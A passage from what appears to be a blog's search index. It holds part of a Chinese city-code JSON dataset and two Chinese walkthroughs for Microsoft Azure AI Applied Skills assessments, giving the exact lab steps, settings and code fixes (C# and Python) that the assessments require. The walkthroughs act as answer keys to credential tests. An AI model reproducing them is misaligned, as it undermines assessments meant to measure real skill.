\u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;山西\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 23, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;陕西\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 24, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;101020100\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;上海\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;200000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;021\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:08\u0026#34; }, { \u0026#34;id\u0026#34;: 25, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;四川\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 26, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;101030100\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;天津\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;300000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;022\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:08\u0026#34; }, { \u0026#34;id\u0026#34;: 27, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;西藏\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 28, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;新疆\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 29, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;云南\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 30, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;浙江\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 31, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;101040100\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;重庆\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: \u0026#34;023\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:08\u0026#34; }, { \u0026#34;id\u0026#34;: 32, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;101320101\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;香港\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;999077\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;+852\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:03:38\u0026#34; }, { \u0026#34;id\u0026#34;: 33, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;101330101\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;澳门\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;999078\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;+853\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:03:39\u0026#34; }, { \u0026#34;id\u0026#34;: 34, \u0026#34;pid\u0026#34;: 0, \u0026#34;city_code\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;台湾\u0026#34;, \u0026#34;post_code\u0026#34;: null, \u0026#34;area_code\u0026#34;: null, \u0026#34;ctime\u0026#34;: null }, { \u0026#34;id\u0026#34;: 35, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101220601\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;安庆\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;246000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0556\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:10\u0026#34; }, { \u0026#34;id\u0026#34;: 36, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101220201\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;蚌埠\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;233000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0552\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:10\u0026#34; }, { \u0026#34;id\u0026#34;: 37, \u0026#34;pid\u0026#34;: 3400, \u0026#34;city_code\u0026#34;: \u0026#34;101220105\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;巢湖市\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;238000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0551\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:03:40\u0026#34; }, { \u0026#34;id\u0026#34;: 38, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101221701\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;池州\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;247100\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0566\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:10\u0026#34; }, { \u0026#34;id\u0026#34;: 39, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101221101\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;滁州\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;239000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0550\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:10\u0026#34; }, { \u0026#34;id\u0026#34;: 40, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101220801\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;阜阳\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;236000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0558\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:10\u0026#34; }, { \u0026#34;id\u0026#34;: 41, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101221201\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;淮北\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;235000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0561\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:11\u0026#34; }, { \u0026#34;id\u0026#34;: 42, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101220401\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;淮南\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;232000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0554\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:11\u0026#34; }, { \u0026#34;id\u0026#34;: 43, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101221001\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;黄山市\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;245000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0559\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 21:23:56\u0026#34; }, { \u0026#34;id\u0026#34;: 44, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101221501\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;六安\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;237000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0564\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:11\u0026#34; }, { \u0026#34;id\u0026#34;: 45, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101220501\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;马鞍山\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;243000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0555\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:11\u0026#34; }, { \u0026#34;id\u0026#34;: 46, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101220701\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;宿州\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;234000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0557\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:11\u0026#34; }, { \u0026#34;id\u0026#34;: 47, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101221301\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;铜陵\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;244000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0562\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:12\u0026#34; }, { \u0026#34;id\u0026#34;: 48, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101220301\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;芜湖市\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;241000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0553\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 21:23:57\u0026#34; }, { \u0026#34;id\u0026#34;: 49, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101221401\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;宣城\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;242000\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0563\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:12\u0026#34; }, { \u0026#34;id\u0026#34;: 50, \u0026#34;pid\u0026#34;: 2, \u0026#34;city_code\u0026#34;: \u0026#34;101220901\u0026#34;, \u0026#34;city_name\u0026#34;: \u0026#34;亳州\u0026#34;, \u0026#34;post_code\u0026#34;: \u0026#34;236800\u0026#34;, \u0026#34;area_code\u0026#34;: \u0026#34;0558\u0026#34;, \u0026#34;ctime\u0026#34;: \u0026#34;2024-06-11 17:30:12\u0026#34; } //.","title":".NET JSON2MySQL"},{"content":"创建智能文档处理解决方案 在第二级中，这3个模块，每一个中都有不同的任务操作，这些操作包括使用 Azure 进行实际创建服务操作或者使用代码调用 Azure的服务，这些代码可以使用python或者C#，这些进行选择。所有的模块内的考试是通过一个邮件的方式进行告知。\nhttps://learn.microsoft.com/en-us/credentials/applied-skills/create-intelligent-document-solution-azure-ai/#applied-skill-take-the-assessment\nstart\n登陆实验环境 加载成功后会出现虚拟机器登陆界面，找到右侧的 Step1 中的用户名密码。登陆 获取实验账号并登陆 Azure 进入到机器后，点击桌面的 Email 图片，打开我们的实验目标。 打开桌面的 email 后，会出现如下的界面。这里主要关注两点： 一个是左侧蓝色的部分：Inbox，这里包括环境信息以及实验目标考题。 另一个是浏览器的页签中的第二个，也就是登陆 Azure 的环境网址\n点击上图的 Azure 标签页，进入登陆页面，用email提供的账号密码登陆\n试验一： Create a prototype 点击邮件中的 Create a prototype 菜单会出现具体的内容要求。\n在第一个实验中主要是使用微软的只能存储服务，并且创建的时候要符合要求，这个服务要满足的要求是要保存所给的文件成Json文件，之后在保存到 Azure 的存储服务中。\n实验流程操作 首先到 Azure 中，搜索所给出的资源组，选择 RG1开头的资源组 进入到资源组后，点击创建按钮。 在搜索框中输入document intelligence 点击选择。 点击 文档智能服务\n进入到服务后，点击蓝色的创建按钮。 在这里直接选择默认的订阅以及资源组，Region 目前建议选择 Japan East（如果后面的步骤，在运行分析文档时，遇到权限不足问题，请在此步骤选择其他 Region ）\n在这里名字填入：from-document-xxx，如（from-document-01）价格层要选择免费层，也就是下图中的 Free F0，之后点击预览创建按钮。\n预览没有问题后，直接点击创建按钮。 创建完毕后，在页面中点击 Go to resource 按钮\n之后点击 Go to Document Intelligence Studio 按钮 进入到服务页面后，下滑页面，点击 Invoices 的 Try it out。\n（如果弹出选择账户的弹框，点击一个就好）\n在服务的填写表格页面，默认的订阅和资源组选择下拉按钮\n预览后点击完成按钮。 在上述步骤完成后，点击左侧的上传区域，点击选择文件按钮，在新弹出的选择文件筐，找到 C:\\Files的文件，之后选择发票pdf\n选择玩文件后，点击 Analyze options 选项，之后选择 all documents，之后点击保存按钮。\n配置完分析选项后，点击直接点击运行分析按钮。\n运行完后，找到右侧的 Result按钮，之后下载下来我们所需要的 JSON 文件。\n刚上传的三个文件，分析完三个都下载下来。\n之后我们重复操作，将所有的图片文件上传。 同样的点击分析按钮。 下载下来结果JSON文件。 最后我们可以看到下载的结果文件如下图这几个在 Downloads 文件夹中（在在这里我们需要复制这些文件 复制上述的文件后粘贴在下图路径的文件夹中。 c:/files 接着我们返回 RG1 的这个资源组（进入步骤在本篇文档开头的位置……），选择 prototype 开头的资源，点击进入 之后我们展开 Data storage 进入到存储服务中选择 Containers\n之后我们创建一个新的 Container，这里直接使用名字：con-invoices。 同样操作再次创建另一个 Containers，名字叫做：con-receipts。 可以看到我这里创建了两个 Containers，一个存pdf的一个存图片的 分别点击两个名字，之后我们开始上传 把所有的 Invoice 相关文件上传 另外一个将所有的 receipt 文件上传。到这里我们的第一个任务就完成了。 试验二：Train a custom model 在实验二中，我们需要创建一个智能文档分析服务，并且进行相关的训练。 首先我们进入 https://documentintelligence.ai.azure.com/studio 页面选择服务：Custom extraction model。 下拉页面，之后点击项目选项中的 创建一个项目按钮，在新页面，输入项目名点击继续按钮。\n在详细页面，订阅以及资源组选项选择默认，智能文档名字要选择我们的题目要求form开头的， API选择：2022-08-31 这里注意除了订阅和资源组选项默认外，我们的存储账号要选择quality开头的这个，这里不要选错。 上述完成后点击预览创建按钮。 等待一会后，在弹出的页面直接点击 Run now 按钮 如果出现 failed to fetch 刷新一下当前的页面 在新页面中，选择一个jpg文件后，点击右侧的添加字段选项 这里根据我们的题目，需要添加如下的几个字段Email里（第一列是字段，第二列是对应的类型） 可以看到我在右侧已经根据题目创建了这5个字段 这里是介绍如何进行选择字段的数据类型*，比如Number字段，要选择 integer 类型。依次把五个标签名都设置好数据类型。 之后我们点击图片的 Number数字，也就是下图的绿色部分的数字，之后点鼠标左键，选择我们刚才创建的 Number 字段 同样的我们把所有的字段都在图片中选择打上标签 重复操作所有的图片文件，将字段标记清楚，之后点击训练按钮. 这里选择训练模型，直接写上 QA-Template，如下图所示。Build Mode 选择 Template 点击 Go to Models 可以看到我们这里已经创建了训练，点击QA-Template\n我们进行测试，直接点击 Test 按钮。 选择电脑中的 C盘下 QA_Test 文件夹内的文件。 点击运行分析按钮 在这里我们需要注意，所有的都分析完后，我们要下载 report0008.jpg的结果，讲这个 JSON文件下载下来。 结果保存下来。存到QA_Test 打开VSCode \u0026raquo; 点击 Open Folder 按钮。 接下来打开 C 盘下的 App1 文件夹\n之后打开Python 文件夹下 App1.py 文件。更改的代码： （！！！格式缩进要！！！注！！！意！！！） #9 task = form_recognizer_client.begin_recognize_invoices(form_data) #21 if field.confidence \u0026gt;= 0.70: invoice_total += field.value #37 folder_path = r\u0026#34;C:\\App1\\Invoices\u0026#34; 之后在 python 目录下的.env文件内，添加自己的创建服务的 endpoint 和 key 值。ctrl S 保存文件 ps：Key 和 endpoint 进入https://portal.azure.com/ ，选择刚刚创建的资源 页面切回 App1.py 这个文件 直接点击右上角三角运行 运行看结果，已经分析出来了\n最后实验完成，点击提交实验等待结果即可。\nEnd\n","permalink":"https://qfsyso.github.io/posts/azure-ai-document-intelligence/","summary":"创建智能文档处理解决方案 在第二级中，这3个模块，每一个中都有不同的任务操作，这些操作包括使用 Azure 进行实际创建服务操作或者使用代码调用 Azure的服务，这些代码可以使用python或者C#，这些进行选择。所有的模块内的考试是通过一个邮件的方式进行告知。\nhttps://learn.microsoft.com/en-us/credentials/applied-skills/create-intelligent-document-solution-azure-ai/#applied-skill-take-the-assessment\nstart\n登陆实验环境 加载成功后会出现虚拟机器登陆界面，找到右侧的 Step1 中的用户名密码。登陆 获取实验账号并登陆 Azure 进入到机器后，点击桌面的 Email 图片，打开我们的实验目标。 打开桌面的 email 后，会出现如下的界面。这里主要关注两点： 一个是左侧蓝色的部分：Inbox，这里包括环境信息以及实验目标考题。 另一个是浏览器的页签中的第二个，也就是登陆 Azure 的环境网址\n点击上图的 Azure 标签页，进入登陆页面，用email提供的账号密码登陆\n试验一： Create a prototype 点击邮件中的 Create a prototype 菜单会出现具体的内容要求。\n在第一个实验中主要是使用微软的只能存储服务，并且创建的时候要符合要求，这个服务要满足的要求是要保存所给的文件成Json文件，之后在保存到 Azure 的存储服务中。\n实验流程操作 首先到 Azure 中，搜索所给出的资源组，选择 RG1开头的资源组 进入到资源组后，点击创建按钮。 在搜索框中输入document intelligence 点击选择。 点击 文档智能服务\n进入到服务后，点击蓝色的创建按钮。 在这里直接选择默认的订阅以及资源组，Region 目前建议选择 Japan East（如果后面的步骤，在运行分析文档时，遇到权限不足问题，请在此步骤选择其他 Region ）\n在这里名字填入：from-document-xxx，如（from-document-01）价格层要选择免费层，也就是下图中的 Free F0，之后点击预览创建按钮。\n预览没有问题后，直接点击创建按钮。 创建完毕后，在页面中点击 Go to resource 按钮\n之后点击 Go to Document Intelligence Studio 按钮 进入到服务页面后，下滑页面，点击 Invoices 的 Try it out。","title":"Azure AI Document Intelligence"},{"content":"https://learn.microsoft.com/en-us/credentials/applied-skills/build-natural-language-solution-azure-ai/#applied-skill-take-the-assessment?ocid=reactor\nstart 进入环境中，点击Step 1，然后点击Password右边的T，登录环境 双击打开桌面的Email文件 对Inbox的内容进行逐个点击，其中Existing Environment包含了微软官方提供的Azure的用户名和密码，proof of concept、Invoice validation、chatbot backend 分别表示的是本次考试的三大任务的具体要求 将邮箱中Existing Environment的用户名和密码依次复制到Azure的标签页面中，并点击Sign in完成Azure的登录\n试验一： Proof of Concept (POC) 点击邮件中的 Proof of Concept (POC) 菜单会出现具体的内容要求，如下图所示。\n在第一个实验中主要是使用微软的 language 服务，并且创建的时候要符合要求，这个服务要满足客户自定义文本标准和 NER。 在实验中另外一个要求是需要使用代码最后调用这个你创建服务。 流程操作 首先在登录主页面搜索栏 搜索RG1，并点击Resource Groups下面的RG1 进入后点击 Create 按钮 之后在首页内搜索language service 点击进入到 Language service 后，点击 Create 之后点击右下方的第二个 select 按钮 选择好之后，点击下方的按钮 continue to create your resource\n在配置页面，按照我们的题目要求，在 Region 中选择 North Europe， 其中 Name 从邮件中找，在 Proof of concept 这里 lang开头的这个名字，作为刚才创建资源的 Name 值 主要需要注意的是在 Pricing tier层里，需要选择 Free F0 的这个，这一点也是题目要求的。 下面选择 Existing storege account ，在存储账户这里，需要选择题目要求的以sa开头的这个账户。\n这些配置都没问题后，直接点击蓝色的 Review + create 按钮。 进入到审核页面，这个页面没有问题后，点击蓝色的 Create 按钮。 等待若干分钟，出现如下画面表示服务创建完成，点击 Go to resource group 点击 进入 lang 开头的这个服务\n在创建完成服务后，进入到服务页面，找到下面如图所示的链接: Click here to manage keys 这里面有所需要的 key和 endpoint 等。\n在这个页面可以看到有两个比较东西是我们在代码中需要的，一个是 key 一个是 endpoint。在后面我们试验一和试验三要用到。\n打开电脑 C:\\PoC\\Csharp文件夹下的 program.cs 将我们的 key 和 endpoint 替换为我们上一步骤中的值。 using Azure; using System; using Azure.AI.TextAnalytics; namespace ProofOfConcept { class Program { private static readonly AzureKeyCredential credentials = new AzureKeyCredential(\u0026#34;{REPLACE-WITH-YOUR-VALUE}\u0026#34;); private static readonly Uri endpoint = new Uri(\u0026#34;{REPLACE-WITH-YOUR-VALUE}\u0026#34;); static void RecognizeYourText(TextAnalyticsClient client) { string document = \u0026#34;Call our office at 312-555-1234 and ask for Graham Barnes, or send an email to support@contoso.com.\u0026#34;; var entities = client.null; // replace null with the correct method to recognize the requested information.a Console.WriteLine($ \u0026#34;Redacted Text: {entities.RedactedText}\u0026#34;); if(entities.Count \u0026gt; 0) { Console.WriteLine($ \u0026#34;Recognized {entities.Count} the following entities {(entities.Count \u0026gt; 1 ? \u0026#34; ies \u0026#34; : \u0026#34; y \u0026#34;)}:\u0026#34;); foreach(var entity in entities) { Console.WriteLine($ \u0026#34;Text: {entity.Text}, Category: {entity.Category}, SubCategory: {entity.SubCategory}, Confidence score: {entity.ConfidenceScore}\u0026#34;); } } else { Console.WriteLine(\u0026#34;No entities were found.\u0026#34;); } } static void Main(string[] args) { var client = new TextAnalyticsClient(endpoint, credentials); RecognizeYourText(client); Console.Write(\u0026#34;Press any key to exit.\u0026#34;); Console.ReadKey(); } } } 进入到cmd中后，build run ~ ok\nOr 用python\n打开电脑 C:\\PoC\\Python 文件夹下的 App1.py key 和 endpoint 替换\nfrom azure.ai.textanalytics import TextAnalyticsClient from azure.core.credentials import AzureKeyCredential # Authenticate the client using your key and endpoint text_analytics_credential = AzureKeyCredential(key) text_analytics_client = TextAnalyticsClient( endpoint=endpoint, credential=text_analytics_credential) # Method for recognizing content in documents def recognize_your_text(client): documents = [ \u0026#34;Call our office at 312-555-1234 and ask for Graham Barnes, or send an email to support@contoso.com.\u0026#34; ] # Replace null with the correct method to recognize the requested information. response = client.recognize_entities(documents, language=\u0026#34;en\u0026#34;) result = [doc for doc in response if not doc.is_error] for doc in result: #print(\u0026#34;Redacted Text: {}\u0026#34;.format(doc.redacted_text)) for entity in doc.entities: print(\u0026#34;Entity: {}\u0026#34;.format(entity.text)) print(\u0026#34;\\tCategory: {}\u0026#34;.format(entity.category)) print(\u0026#34;\\tConfidence Score: {}\u0026#34;.format(entity.confidence_score)) print(\u0026#34;\\tOffset: {}\u0026#34;.format(entity.offset)) print(\u0026#34;\\tLength: {}\u0026#34;.format(entity.length)) recognize_your_text(text_analytics_client) 目录的地址栏，输入cmd按下回车\npython App1.py ok 试验二：Invoice validation 在第二个实验中主要使用了 NER 去抽取指定内容。这需要在 Azure 的语言服务中去部署一个 Language studio 服务。\n流程操作 接着返回我们刚才复制key和EndPoint那个语言服务的界面，点击左边栏的Overview，首先在我们的语言服务 lang-41073075 中找到 Language studio 服务并点击进入。\n进入到服务中后，按照如图所示配置自己的 订阅、资源类型以及资源名字，这里都是点击下拉菜单进行选择。进入到该页面后，如果显示没有登录的状态，点击右上角的 Sign in，登录后进入到如下界面\n选择已有的存在项，Resource type 这里选择 Language。选择好后，点击 Done 配置好 Language Studio后，选择 Extraction information 下面的标签 拉页面， 在这页面找到 Custom named entity recognition 服务，点击进入。 在页面中点击创建新项目按钮。 类似于前面的操作，先配置订阅、资源、存储等信息如下图所示，点击 Next 在基础信息部分，需要对设置名字，这里根据题目设置名字为：webshop，主语言选择 English（US）。 在 Blob store container 选择名字 webshop，点击 Next 点击 Create project 创建完毕后，我们需要创建entity，进入到 Data labeling 页面，点击右侧的 Add entity 按钮，根据题目，分别添加 Price 和 CustomerName，主页这里下图我只显示了添加方法，具体的 Price 和 CustomerName 要都添加出来。 创建完 entity 后，依次点击这 10 个文件，给里面的文件内容打标签 就要给数据打标签，先点击标签后面的笔形状的按钮，然后选择好对应的信息，Name 后面标记 CustomerName 的信息，Price 后面的信息标记 Price 标签。标记上就是和图片上的一样。每标记完一个，点击 next document，直到 10 个文件都标记好 注意：这个步骤要讲所有的文档都打上标签。\n完成上述所有标签后，点击菜单中的 Training jobs，点击 Start a training job。\n为自己的训练模型取一个名字，例如 model-job-01 之后点击 Train 按钮。 点击按钮后的页面，到此步骤，页面在后台自己训练就好。实验2就完成了。 试验三：Chatbot backend 在这个实验中主要是创建一个对话机器人，之后导入具体的模型后，使用代码进行对话操作。 实验流程 进入 https://language.cognitive.azure.com/home 选择 Understand questions and conversational language 中找到 Conversational language understanding 子服务。进入\n进入到 Conversational language understanding 子服务后，点击 Import 按钮，选择C:\\project 文件夹下的 lang4567.json 文件，name 命名为 lang4567 ，点击 done 完成上面步骤后，点击 Training jobs 菜单。 点击 Starting a training job 在我们新建的训练任务重，选择训练模型，也就是我们上面创建的lang4567 在这里数据切割选项需要注意，根据题目设置 85% 和 15%。 858585\n直接点击 Train 按钮，进行训练 点击左边栏的 Deploying a model 后，点击Add deployment。等待模型训练完成 出现如下图标，我们进行部署\n点击Add deployment。 在新页面选择创建一个新部署，名字和模型都设置为 lang4567，添加完成后，点击部署按钮。\n等待模型部署完成\n双击打开 C:\\CLU_PoC\\Csharp 文件夹下面的 .cs ，先要做的是类似第一个试验上面的替换key和endpoint，但是 projectName 和 deploymentName 分别是我们刚才设置的 lang4567。 刚第一题的key 和 EndPoint 是一样的\nusing Azure; using System; using System.Text.Json; using Azure.Core; using Azure.AI.Language.Conversations; namespace ProofOfConcept { class Program { private static readonly AzureKeyCredential credential = new AzureKeyCredential(\u0026#34;{REPLACE-WITH-YOUR-VALUE}\u0026#34;); private static readonly Uri endpoint = new Uri(\u0026#34;{REPLACE-WITH-YOUR-VALUE}\u0026#34;); private static readonly string projectName = \u0026#34;{REPLACE-WITH-YOUR-VALUE}\u0026#34;; private static readonly string deploymentName = \u0026#34;{REPLACE-WITH-YOUR-VALUE}\u0026#34;; static void RecognizeYourText(string ? query) { if(query == null || query.Length \u0026gt; 1000) { query = \u0026#34;can you send me a few gizmos?\u0026#34;; } var data = new { analysisInput = new { conversationItem = new { text = query, id = \u0026#34;1\u0026#34;, participantId = \u0026#34;1\u0026#34;, } }, parameters = new { projectName, deploymentName, stringIndexType = \u0026#34;Utf16CodeUnit\u0026#34;, }, kind = \u0026#34;Conversation\u0026#34;, }; // Create client and send request var client = new null(endpoint, credential); // replace null with the correct method to recognize the requested information. Response response = client.null(RequestContent.Create(data)); // replace null with the correct method to recognize the requested information. if(response.ContentStream == null) { Console.WriteLine(\u0026#34;No response received.\u0026#34;); return; } using JsonDocument result = JsonDocument.Parse(response.ContentStream); JsonElement conversationalTaskResult = result.RootElement; JsonElement conversationPrediction = conversationalTaskResult.GetProperty(\u0026#34;result\u0026#34;).GetProperty(\u0026#34;prediction\u0026#34;); Console.WriteLine(\u0026#34;Intents:\u0026#34;); foreach(JsonElement intent in conversationPrediction.GetProperty(\u0026#34;intents\u0026#34;).EnumerateArray()) { Console.WriteLine($ \u0026#34;Category: {intent.GetProperty(\u0026#34; category \u0026#34;).GetString()}\u0026#34;); Console.WriteLine($ \u0026#34;Confidence: {intent.GetProperty(\u0026#34; confidenceScore \u0026#34;).GetSingle()}\u0026#34;); Console.WriteLine(); } Console.WriteLine(\u0026#34;Entities:\u0026#34;); foreach(JsonElement entity in conversationPrediction.GetProperty(\u0026#34;entities\u0026#34;).EnumerateArray()) { Console.WriteLine($ \u0026#34;Category: {entity.GetProperty(\u0026#34; category \u0026#34;).GetString()}\u0026#34;); Console.WriteLine($ \u0026#34;Text: {entity.GetProperty(\u0026#34; text \u0026#34;).GetString()}\u0026#34;); Console.WriteLine($ \u0026#34;Offset: {entity.GetProperty(\u0026#34; offset \u0026#34;).GetInt32()}\u0026#34;); Console.WriteLine($ \u0026#34;Length: {entity.GetProperty(\u0026#34; length \u0026#34;).GetInt32()}\u0026#34;); Console.WriteLine($ \u0026#34;Confidence: {entity.GetProperty(\u0026#34; confidenceScore \u0026#34;).GetSingle()}\u0026#34;); Console.WriteLine(); } } static void Main(string[] args) { string ? input = null; if(args.Length \u0026gt; 0) { input = System.IO.File.ReadAllText(args[0]); } RecognizeYourText(input); Console.Write(\u0026#34;Press any key to exit.\u0026#34;); Console.ReadKey(); } } } cmd build run , ok\nor 双击打开 C:\\CLU_PoC\\Python 文件夹下面的 App1.py ，先要做的是类似第一个试验上面的替换key和endpoint，但是 project_name 和 deployment_name 分别是我们刚才设置的 lang4567。 刚第一题的key 和 EndPoint 是一样的\n修改完代码后，跟试题一同样的方法，在当前文件的文件夹地址栏输入 cmd ,在命令窗口输入python App1.py运行 App1 ，有如下信息后证明成功 完成3个步骤试验后，点击界面中的 Submit Assessment 按钮，弹出的确认页面后点击 